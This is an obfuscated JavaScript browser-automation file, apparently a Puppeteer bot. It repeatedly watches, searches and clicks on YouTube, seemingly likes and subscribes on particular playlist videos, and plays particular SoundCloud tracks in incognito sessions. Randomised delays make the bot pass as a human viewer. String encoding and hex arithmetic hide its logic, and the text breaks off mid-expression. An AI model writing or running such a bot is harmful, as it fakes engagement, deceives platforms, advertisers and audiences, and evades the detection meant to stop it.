const a0 = c,
  Z = d,
  X = b;

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1234 * 0x1 + -0x21c + -0x19c * 0xa);
    let h = e[f];
    return h;
  }, d(b, c);
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x1 * -0x1025 + -0x1 * -0x1a46 + -0xa20 * 0x1))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x88b + 0x18ad + -0x2138), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x22 * -0x1eb + 0x3e40 * 0x1 + 0xa9 * 0xb6 + (0x3b * 0x1f + 0x5fbd + -0x2c4a) * random()) : await standardWaitForNetIdle(f), await wait(-0x18cb + -0x15c * 0x19 + 0x4e4f + (-0xb94 * 0x1 + 0x7fd + 0x2aa7 * 0x1) * random()), -0x4 * -0x637 + 0x1425 + -0x2d00;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x60 * -0x4 + -0x408 + 0x1610), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0xa76 + 0x5a4 + 0x4d3;
}
async function randomWait() {
  return await wait(-0x3 * 0x1cf + 0xc47 * -0x2 + -0x9e7 * -0x5 + (0x20a7 + 0x11d5 + -0x1ef4) * random()), -0x1 * -0x218b + 0xeb1 + -0x1 * 0x303b;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0xcac + 0x1 * 0xdb7 + -0x1a63, -0xf2 * 0x27 + -0x6f1 + 0x2bd6), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x19806 + 0x15d91 + 0x1ec7 * -0x11) * getRandomInt(-0x8b8 + 0x1f65 + -0x33d * 0x7, 0x1c6d + 0xf62 * -0x1 + 0x2 * -0x683), h)), -0x224 + 0x1d2 * -0xe + 0x1ba1;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const R = c,
      h = {
        'Seconds': 0x3e8,
        'Minutes': 0xea60,
        'Hours': 0x36ee80,
        'Second': 0x3e8,
        'Minute': 0xea60,
        'Hour': 0x36ee80
      };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x1 * 0x25c9 + -0xcad + -0x2 * 0xc8e;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x240d + 0x412 * 0x9 + 0x2 * -0x2457]['split']('\x20');
    for (let k = -0x26c9 + 0x58e + 0x213b; k < i[R(0x8)]; k += 0x1 * -0x11de + -0xb71 + -0x4f * -0x5f)
      j += i[k] * h[i[k + (-0xad0 + -0xae9 + 0x15ba)]];
    return j;
  });
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1234 * 0x1 + -0x21c + -0x19c * 0xa);
    let h = e[f];
    if (c['fIBBXX'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x17cd + -0x15e3 + -0x1ea, r, s, t = 0x8cd + 0x3 * 0x530 + -0x185d; s = m['charAt'](t++); ~s && (r = q % (0x1 * -0x1025 + -0x1 * -0x1a46 + -0xa1d * 0x1) ? r * (0x88b + 0x18ad + -0x20f8) + s : s, q++ % (0x1a * -0x6b + 0xa60 * 0x1 + 0xa * 0xd)) ? o += String['fromCharCode'](0x7a * 0x5 + 0x1fea + -0x214d & r >> (-(-0x18cb + -0x15c * 0x19 + 0x3ac9) * q & -0x5ca * 0x1 + 0x3ff + 0x9b * 0x3)) : -0x4 * -0x637 + 0x1425 + -0x2d01) {
          s = n['indexOf'](s);
        }
        for (let u = -0x60 * -0x4 + -0x408 + 0x288, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0xa76 + 0x5a4 + 0x4e2))['slice'](-(-0x3 * 0x1cf + 0xc47 * -0x2 + -0x1dfd * -0x1));
        }
        return decodeURIComponent(p);
      };
      c['amhjSK'] = i, b = arguments, c['fIBBXX'] = !![];
    }
    const j = e[0x20a7 + 0x11d5 + -0x327c],
      k = f + j,
      l = b[k];
    return !l ? (h = c['amhjSK'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const S = c,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => S(0x13) + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x80f * -0x2 + 0x1cfb + -0x2d13)['map'](l => Array['from'](l['children']))['flat'](0x1f86 + -0x3 * -0x266 + 0x26b7 * -0x1)['map'](l => l['childNodes'][-0xd7 * 0x22 + 0x22 * -0x23 + 0x1 * 0x2135]['childNodes'][-0x220 * 0x11 + 0x1ef3 * 0x1 + 0x52d]['childNodes'][-0xa7 * 0x21 + -0x1ea + -0xbb9 * -0x2]['childNodes'][0x17a6 + 0x88 + -0x182e]['childNodes'][0xa76 + -0xdb3 * 0x2 + -0x10f1 * -0x1]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x312 + -0xa * -0x52 + 0x3c6, -0x6ee + -0x1289 * 0x1 + -0x1 * -0x2cff)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x14f * 0x53 + 0x162a + 0x910b);
  const h = await getMaxTime(f),
    i = Math['min']((-0x2 * -0xe45e + 0xc3b7 + -0x1601 * 0x13) * getRandomInt(0x3 * 0x431 + 0x1cab + 0x2 * -0x149e, 0x1 * 0x57a + 0x1dbb + -0x2330), h);
  return await wait(i), 0x2681 * 0x1 + -0xa0b + 0x5 * -0x5b1;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x15d1 + -0x2eb * 0x3 + -0x7 * -0x45e]['children'][0x1f8 + 0x118b + -0x681 * 0x3]['children'][-0xbbe + -0x1 * 0x6b6 + 0x1274]['children'][-0xe8 * -0x3 + 0x2401 * 0x1 + -0x26b9]['children'][0x24a0 + -0x4e3 * 0x6 + 0x55 * -0x16]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x259f * 0x1 + 0x743 + -0x2ce1;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x12b2 * 0x2 + -0x2481 + 0x4a49 + (0x590 + 0x179f + -0x1cfd) * random()
  }), await wait(0xcad + 0x389 + -0xe42 + (-0x2 * 0x1365 + -0x1d1 * 0x13 + 0xcd * 0x5d) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    const T = c;
    if (!await f[T(0xd)](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x1c65 + 0x1b1b + 0x53 * 0x4]['childNodes'][-0x1e4f * 0x1 + -0x8 * 0x22 + -0x1f60 * -0x1]['childNodes'][-0x1c17 + -0xc5a + 0x1f * 0x14e]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0xce4 + 0x5 * 0x751 + -0x3174]['childNodes'][-0x3b5 * 0x1 + -0x8 * 0x392 + 0x2045]['childNodes'][-0x1cce + -0x128f + 0x1 * 0x2f5f]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x1 * 0xf1 + -0x635 + 0x727 * 0x1),
          r = 0xf * 0xe2 + 0x6bc * 0x4 + -0x282e;
        for (let u = 0x12fa + -0x17 * 0x170 + -0x1 * -0xe16; u < q['length']; u += 0x1433 + -0x5ef + -0x19 * 0x92)
          r += q[u] * k[q[u + (0xd81 + -0x14e8 * 0x1 + 0xed * 0x8)]];
        return r;
      }(n);
  });
  await wait((-0x30d4 * 0x1 + -0x2921 + 0x948d) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x1630d * -0x1 + -0x1b * -0xb33 + 0x2 * -0xd387) * getRandomInt(-0x1e72 + 0xa28 + 0x144b, -0xf * 0x159 + -0xe2f + 0x2270), h + (0x1 * -0x71f + -0x606 + 0x20ad));
  return await wait(i), -0xe5e + 0x229e + -0x143f;
}

function a() {
  const bn = [
    'W55PrCoclCorFmozW7nA',
    'wdCYB1vZrLy3Cq',
    'users',
    'W6ddMmkBqSoApIO/WQ/cUq',
    'mguZr1bLytfuEq',
    'bSkPaa',
    'DxbKyxrL',
    'WR/dJWlcGCoGW6r+W5/cKSol',
    'BgvUz3rO',
    'c355kSkln8o5WPVcQCku',
    'close',
    'Ahr0Chm6lY9VCa',
    'W748WRddHIbpW4y',
    'zxzHBhvHDgu',
    'W4GwW7tcLuGNDJm/W7m',
    'W6S4WQpdIYXFW6JcTmkOWPu',
    'ad/cISo5',
    'W4qCW6ldJgKTzZn+WRu',
    'W7uik0meWOhcRLLEFG',
    'C3r5BguTC2nVCa',
    'pts/by-sit',
    'WQRdPuhcTey9W7pcVmoPW64',
    'W6lcGKxcGXBcVmowWO0',
    'easyfork.o',
    'O4-B3OFPDf',
    'ipny6JUbzw',
    'mSoBoSkvo8oF',
    'B28TAw8TA3j1BG',
    'WQNcKW7dL8odBCoYsJKr',
    'nSokimkcpmknW4pcJaVcSq',
    'CCoMt8klW6rfBmoKiJy',
    'm7aliUAwm_'
  ];
  a = function() {
    return bn;
  };
  return a();
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0xe * 0x19f + 0x354 + 0x135e), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0xe1d + 0x2134 + 0xd * -0x2bd + (0xb * 0x2c2 + 0x2b * 0x27 + 0x1 * -0x20fb) * Math['random']());
    });
  }, 0x6d * -0x3 + -0xf82 + 0x2c21);
  await wait(0x9ec * -0xda + 0x1 * -0x23bf1 + -0x3 * -0x51643);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x10f4 + -0x2 * -0x3170 + 0x768c) * getRandomInt(0x71 * 0x4f + 0x4 * -0x120 + -0x1e5b, -0x11c + -0x771 + 0x8a6)), clearInterval(h), -0x2171 * 0x1 + 0x2504 + 0x392 * -0x1;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1234 * 0x1 + -0x21c + -0x19c * 0xa);
    let h = e[f];
    if (b['hoWsTt'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x17cd + -0x15e3 + -0x1ea, s, t, u = 0x8cd + 0x3 * 0x530 + -0x185d; t = n['charAt'](u++); ~t && (s = r % (0x1 * -0x1025 + -0x1 * -0x1a46 + -0xa1d * 0x1) ? s * (0x88b + 0x18ad + -0x20f8) + t : t, r++ % (0x1a * -0x6b + 0xa60 * 0x1 + 0xa * 0xd)) ? p += String['fromCharCode'](0x7a * 0x5 + 0x1fea + -0x214d & s >> (-(-0x18cb + -0x15c * 0x19 + 0x3ac9) * r & -0x5ca * 0x1 + 0x3ff + 0x9b * 0x3)) : -0x4 * -0x637 + 0x1425 + -0x2d01) {
          t = o['indexOf'](t);
        }
        for (let v = -0x60 * -0x4 + -0x408 + 0x288, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0xa76 + 0x5a4 + 0x4e2))['slice'](-(-0x3 * 0x1cf + 0xc47 * -0x2 + -0x1dfd * -0x1));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x20a7 + 0x11d5 + -0x327c,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x1 * -0x218b + 0xeb1 + -0x9 * 0x55c; u < 0xcac + 0x1 * 0xdb7 + -0x1963; u++) {
          p[u] = u;
        }
        for (u = -0xf2 * 0x27 + -0x6f1 + 0x2bcf; u < 0x2201 + 0x1d22 + 0x3e23 * -0x1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x8b8 + 0x1f65 + -0xb3 * 0x1f), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1c6d + 0xf62 * -0x1 + 0x15 * -0x9f, q = -0x224 + 0x1d2 * -0xe + 0x1ba0;
        for (let v = 0x1 * 0x25c9 + -0xcad + -0x2 * 0xc8e; v < n['length']; v++) {
          u = (u + (0x240d + 0x412 * 0x9 + 0x2 * -0x2457)) % (-0x26c9 + 0x58e + 0x223b), q = (q + p[u]) % (0x1 * -0x11de + -0xb71 + -0x1 * -0x1e4f), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0xad0 + -0xae9 + 0x16b9)]);
        }
        return t;
      };
      b['iUjHrH'] = m, c = arguments, b['hoWsTt'] = !![];
    }
    const j = e[-0x80f * -0x2 + 0x1cfb + -0x2d19],
      k = f + j,
      l = c[k];
    return !l ? (b['plRfeu'] === undefined && (b['plRfeu'] = !![]), h = b['iUjHrH'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x260d + -0x5f4 + 0x2c01;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x2021 + 0x22d * -0x4 + 0x28d6;
    await randomWait();
  }
  return 0x97 * -0x10 + 0x1 * -0xc2c + 0x1 * 0x159d;
}

function fetchRandomSC() {
  return Math['random']() <= -0x110b + 0x5bf * -0x2 + 0x1c89 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x15c8 + -0x1b7c + 0x4 * 0x16d + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const U = d;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0xfd * 0x16 + -0x2 * 0xb51 + 0xe4 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x5f3 * -0x1 + 0x1b06 + 0x5 * -0x437;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xd7e2 + 0x153d9 + -0x17bf3 + getRandomInt(0x84e * 0x2 + 0x720f * 0x1 + -0x4813, 0x603e + 0x23df * -0x3 + -0x808f * -0x1));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x18e2 + 0x1647 + -0x14e * -0x2), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x12a + -0x142f + 0x1305;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x43 * 0x1 + -0x11bb * -0x2 + -0x1 * 0x23b9, 0x105a + -0x1a04 + -0x9dc * -0x1)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r[U(0xa)](), i()) : (await new Promise(w => setTimeout(w, 0x115 + -0x239b + 0x2a56 + floor((0xa6d + -0x1a6f + 0x2 * 0x9f5) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x199a5836 + -0x28d818c * 0xc + 0xb83c6ac6),
          -0x4e85 * 0x126 + -0x9f52ac + -0x15ef * -0x1136,
          0xb612 + -0x6745 + 0x3133,
          0x1cd8 + -0x1 * 0xe45 + -0xe13
        ], y = [
          -0x1c1 + 0xf * -0x26b + 0x261e,
          0x222d + 0x57e + -0x279b * 0x1,
          0x2438 + -0x112b + 0x657 * -0x3,
          0x14e3 * -0x1 + -0xae4 + 0x1fc7
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0xa * 0x1f7 + -0xd * -0x1ac + -0x2961)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x2 * -0xf1b + 0x2ae * 0x5 + -0x2b9c * 0x1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const W = c,
                V = b;
              if ('string' == typeof N)
                return K['createHash'](V(0x10, 'Xctz'))[W(0x6)](N, 'utf8')['digest'](V(0x5, 'GA0z'));
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x85b + 0x496 + 0x3c5) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x1d8e + 0x111b + 0x1 * 0xc73] = A[-0x1ea5 + -0x3 * -0x5c6 + 0xd63] = A[-0x24a5 + -0x26d9 + 0x4b7f] = A[-0x26e5 + 0x5b3 + -0x7d * -0x44] = A[-0x1059 + 0x15ec + -0x164 * 0x4] = A[-0x1 * -0x1bed + 0xd * 0x88 + -0xb9b * 0x3] = A[-0x2aa * 0x5 + -0xb73 * 0x1 + 0x18ca] = A[0x241 * 0x7 + 0x304 * -0xa + 0x4cd * 0x3] = A[0xd0f + -0x65c + 0x1c * -0x3d] = A[0x29 * 0xf + -0x508 + -0xe3 * -0x3] = A[0x3 * 0x925 + -0x1911 + 0xc7 * -0x3] = A[-0x1a46 + -0x122d + -0x2c7d * -0x1] = A[0x243e + 0x47 * -0x5f + -0xc2 * 0xd] = A[-0x3 * 0x67b + 0x4 * 0x121 + 0xef9] = A[-0x2676 + 0x5f3 * -0x1 + 0x2c76] = A[0x1a01 + -0x4cc * -0x3 + -0x2857] = A[0x22a0 + 0x1 * 0xe6f + 0x3100 * -0x1] = 0x798 + 0x1 * 0x1d2d + -0x24c5, this['blocks'] = A) : this['blocks'] = [
                0x9f * -0x5 + 0x159d + -0x1282,
                -0x1f68 + 0x1b1f + 0x1 * 0x449,
                -0x517 + 0xf8b + -0xa74,
                -0x1 * 0x2420 + 0x29 * 0x1b + 0x1fcd,
                0x1fe5 + -0x8 * -0x19d + 0x2ccd * -0x1,
                -0x269 * 0xb + 0xf90 * 0x2 + 0x49d * -0x1,
                0x264b + -0xe76 + -0x17d5,
                0x6b * -0x43 + -0x1 * -0x1fb2 + 0x23 * -0x1b,
                -0x199a + 0x4d * -0x4f + 0x1 * 0x315d,
                -0x17 * 0x53 + -0x71 * 0x4f + 0x2a54,
                -0x2cb + -0x1 * 0xb93 + 0xe5e,
                0x1 * -0x1b25 + 0xc65 + 0xec0,
                -0x419 * 0x1 + -0x2 * -0x85f + -0x27 * 0x53,
                -0xb12 * 0x3 + 0x22a * -0xe + 0x16 * 0x2e3,
                0x1924 + -0x7cf + 0x5c7 * -0x3,
                0x837 * -0x1 + -0x4 * 0x904 + 0x1 * 0x2c47,
                0x8ee + 0x1e9c * 0x1 + -0x278a
              ], this['h0'] = 0x6f7f3bbb + -0x1 * 0x9c7a5e2b + -0x94404571 * -0x1, this['h1'] = -0xd92e7aa5 + 0x146387fde + 0x8 * 0x105874ca, this['h2'] = -0x24a * -0x31e806 + -0x1eef43b7 * -0x8 + -0xd0fc5e76, this['h3'] = -0x104d3e75 + 0x1ab2a2ee + 0x1 * 0x5cceffd, this['h4'] = -0xb0f9ee50 + 0xbfc * 0x47f69 + 0x1c * 0xb63a37f, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1 * 0x1e5e + -0xd * 0x266 + 0x8 * 0x1a, this['finalized'] = this['hashed'] = -0x3 * 0x1f7 + 0x1 * 0x178c + -0x11a7 * 0x1, this['first'] = -0x157a * -0x1 + 0x2507 + -0x3a80;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x1ae3 * -0x1 + -0x1 * 0x2bd + 0x119 * -0x16, O = J['length'] || 0x1c49 + 0x1 * -0x78b + 0x12 * -0x127, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x1992 + 0x1215 + 0x77d, P[0x5 * -0x161 + 0x4 * 0x79f + -0x1797] = this['block'], P[-0x2024 + 0x1952 + -0x371 * -0x2] = P[0x264e + -0x1a53 + -0xbfa] = P[0x2035 + 0x7cc + -0x27ff] = P[-0x4f3 * -0x1 + 0x1230 + -0x25 * 0xa0] = P[0x1e1e + 0x14f + -0x1 * 0x1f69] = P[0x2d5 + 0x2 * -0xeef + 0x1b0e] = P[-0x2496 + 0x20 * 0x9f + -0x7e * -0x22] = P[0x1733 * 0x1 + 0x6a2 * -0x1 + -0x108a] = P[0x5e * 0x1e + 0xe * 0x60 + 0x1 * -0x103c] = P[-0xf90 + -0x1abe + -0x3 * -0xe1d] = P[-0x1a6 + 0x1c9b * 0x1 + -0x1aeb] = P[-0x1af * -0xb + -0x10 * 0x1c + -0x10ba] = P[0xf7f + -0x77c + -0x7f7] = P[-0x21 * 0xbf + -0x6dd * 0x2 + 0x2666] = P[-0x9c9 + 0x11a7 + -0x7d0] = P[0x22 * -0x13 + -0x254e + -0x27e3 * -0x1] = 0x931 + 0x1fdf + -0x1488 * 0x2), K) {
                    for (N = this['start']; M < O && N < 0x99 * 0x1c + 0x11cd + 0x83 * -0x43; ++M)
                      P[N >> -0x862 * 0x2 + 0x21 * 0x4d + 0x6d9] |= J[M] << y[-0x943 * -0x4 + -0x9d * -0x2c + -0x4005 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x4 * -0x94f + -0x3 * 0x72d + 0x3b03; ++M)
                      (L = J['charCodeAt'](M)) < 0x869 * 0x1 + -0x21a * -0x3 + 0x4bd * -0x3 ? P[N >> -0x1c37 + 0x9e * 0x6 + -0x1 * -0x1885] |= L << y[-0x1189 * -0x2 + 0x1d0a + -0x4019 & N++] : L < 0xc32 + -0x1a2d + 0x15fb ? (P[N >> 0x2c8 * 0xa + 0xc * 0x2ac + -0x1 * 0x3bde] |= (-0x1dc0 + 0x3 * 0x36f + 0x1433 | L >> -0x10e1 + -0x5 * 0x569 + 0x4 * 0xafd) << y[0x21fe + -0x17ae + -0x3 * 0x36f & N++], P[N >> -0x1a1b * -0x1 + 0x4f3 * -0x2 + -0xb * 0x179] |= (0x953 + 0x1b43 + -0x2 * 0x120b | 0x205d + -0xd * -0x23b + 0xc39 * -0x5 & L) << y[0x20dc + 0x13d * -0x19 + -0x1e4 & N++]) : L < 0x1 * -0x107e6 + 0x16e12 + 0x1d6 * 0x3e || L >= 0x1 * -0x158f7 + 0x109d1 + 0x9793 * 0x2 ? (P[N >> -0xd1 * -0x19 + -0x1571 + 0x10a] |= (-0x1 * -0x3e6 + -0x242d + 0x2127 | L >> 0x2 * -0x705 + 0x10a9 + -0x293) << y[-0x1d72 + 0x102a + 0xd4b & N++], P[N >> -0x759 + -0x8aa + 0x3 * 0x557] |= (0xb66 + 0x26ff + -0x35 * 0xf1 | L >> 0x9c0 + -0x15 * 0xb3 + 0x4f5 & -0x1 * 0xbc3 + -0x158a + 0x218c) << y[-0xa5 * -0x24 + 0xf * -0xe2 + -0x9f3 * 0x1 & N++], P[N >> 0xa9 * -0x25 + -0x1cca + 0x7d * 0x6d] |= (0x1653 + 0x21e2 * 0x1 + -0xd * 0x449 | -0x1 * 0x22a7 + 0x1 * 0xb6f + 0x1777 & L) << y[0x12a2 + -0x9b9 * 0x4 + 0x1 * 0x1445 & N++]) : (L = 0x1 * -0x15334 + 0x328 * -0x3d + -0x5 * -0x9d8c + ((0xa70 + 0x1d62 + -0x3 * 0xbf1 & L) << 0xf83 + 0x10a + -0x1083 